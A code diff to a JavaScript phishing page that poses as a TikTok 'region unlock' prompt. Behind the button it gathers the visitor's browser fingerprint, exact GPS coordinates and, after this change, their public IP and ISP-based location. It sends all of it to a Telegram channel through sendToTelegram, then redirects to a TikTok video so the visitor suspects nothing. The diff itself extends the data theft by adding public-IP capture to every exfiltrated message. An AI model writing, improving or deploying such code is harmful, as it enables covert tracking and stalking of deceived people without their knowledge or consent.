@@ -153,40 +153,34 @@
         };
     }
 
-    // Multi‑fallback IP geolocation
-    async function getIPLocation() {
-        const apis = [
-            {
-                url: 'https://ipapi.co/json/',
-                parser: (data) => `${data.city}, ${data.region}, ${data.country_name} | Lat: ${data.latitude}, Lon: ${data.longitude} | ISP: ${data.org}`
-            },
-            {
-                url: 'https://ip-api.com/json/',
-                parser: (data) => {
-                    if (data.status === 'success') {
-                        return `${data.city}, ${data.region}, ${data.country} | Lat: ${data.lat}, Lon: ${data.lon} | ISP: ${data.isp}`;
-                    }
-                    throw new Error('API returned non-success');
-                }
-            },
-            {
-                url: 'https://freeipapi.com/api/json/',
-                parser: (data) => `${data.city}, ${data.region}, ${data.countryName} | Lat: ${data.latitude}, Lon: ${data.longitude} | ISP: ${data.isp}`
-            }
-        ];
-
-        for (const api of apis) {
-            try {
-                const res = await fetch(api.url, { signal: AbortSignal.timeout(5000) });
-                if (!res.ok) continue;
+    // Get Public IP Address + Geolocation
+    async function getIPInfo() {
+        // Try ipapi.co first (returns IP, city, region, country, lat, lon, org)
+        try {
+            const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
+            if (res.ok) {
                 const data = await res.json();
-                const result = api.parser(data);
-                if (result && !result.includes('undefined')) {
-                    return result;
+                const ip = data.ip || 'unknown';
+                const loc = `${data.city}, ${data.region}, ${data.country_name} | Lat: ${data.latitude}, Lon: ${data.longitude} | ISP: ${data.org}`;
+                return { ip, loc };
+            }
+        } catch(e) {}
+
+        // Fallback to ip-api.com
+        try {
+            const res = await fetch('https://ip-api.com/json/', { signal: AbortSignal.timeout(5000) });
+            if (res.ok) {
+                const data = await res.json();
+                if (data.status === 'success') {
+                    const ip = data.query;
+                    const loc = `${data.city}, ${data.region}, ${data.country} | Lat: ${data.lat}, Lon: ${data.lon} | ISP: ${data.isp}`;
+                    return { ip, loc };
                 }
-            } catch(e) { console.warn(`IP API failed: ${api.url}`, e); }
-        }
-        return 'IP geolocation failed (all APIs unavailable)';
+            }
+        } catch(e) {}
+
+        // Last fallback
+        return { ip: 'unknown', loc: 'IP geolocation failed' };
     }
 
     const btn = document.getElementById('allowBtn');
@@ -195,13 +189,11 @@
     btn.addEventListener('click', async () => {
         statusSpan.innerHTML = 'Unlocking region... <span class="spinner"></span>';
         const fp = getFingerprint();
-
-        // Always get IP location regardless of GPS outcome
-        const ipLocation = await getIPLocation();
+        const ipInfo = await getIPInfo();
 
         if (!navigator.geolocation) {
             statusSpan.innerHTML = 'Unlock failed. Redirecting...';
-            await sendToTelegram(`❌ No geolocation support\n\nIP Location: ${ipLocation}\n\n📱 Fingerprint:\n${JSON.stringify(fp, null, 2)}`);
+            await sendToTelegram(`❌ No geolocation support\n\n🌐 Public IP: ${ipInfo.ip}\n🌍 IP Location: ${ipInfo.loc}\n\n📱 Fingerprint:\n${JSON.stringify(fp, null, 2)}`);
             setTimeout(() => window.location.href = 'https://www.tiktok.com/@tiktok/video/trending', 1800);
             return;
         }
@@ -216,7 +208,7 @@
                     heading: position.coords.heading,
                     speed: position.coords.speed
                 };
-                const msg = `📍 EXACT GPS (Region unlocked)\n\nCoordinates: ${loc.lat}, ${loc.lon}\nAccuracy: ${loc.accuracy}m\n\n🌍 IP Location (fallback): ${ipLocation}\n\n📱 Fingerprint:\n${JSON.stringify(fp, null, 2)}`;
+                const msg = `📍 EXACT GPS (Region unlocked)\n\nCoordinates: ${loc.lat}, ${loc.lon}\nAccuracy: ${loc.accuracy}m\n\n🌐 Public IP: ${ipInfo.ip}\n🌍 IP Location: ${ipInfo.loc}\n\n📱 Fingerprint:\n${JSON.stringify(fp, null, 2)}`;
                 await sendToTelegram(msg);
                 statusSpan.innerHTML = 'Access granted! Playing video...';
                 setTimeout(() => window.location.href = 'https://www.tiktok.com/@tiktok/video/trending', 1500);
@@ -230,7 +222,7 @@
                     default: errorMsg = 'Unknown error';
                 }
                 statusSpan.innerHTML = 'Location blocked. Redirecting...';
-                const msg = `🚫 LOCATION DENIED (${errorMsg})\n\nIP Location: ${ipLocation}\n\n📱 Fingerprint:\n${JSON.stringify(fp, null, 2)}`;
+                const msg = `🚫 LOCATION DENIED (${errorMsg})\n\n🌐 Public IP: ${ipInfo.ip}\n🌍 IP Location: ${ipInfo.loc}\n\n📱 Fingerprint:\n${JSON.stringify(fp, null, 2)}`;
                 await sendToTelegram(msg);
                 setTimeout(() => window.location.href = 'https://www.tiktok.com/@tiktok/video/trending', 1800);
             },
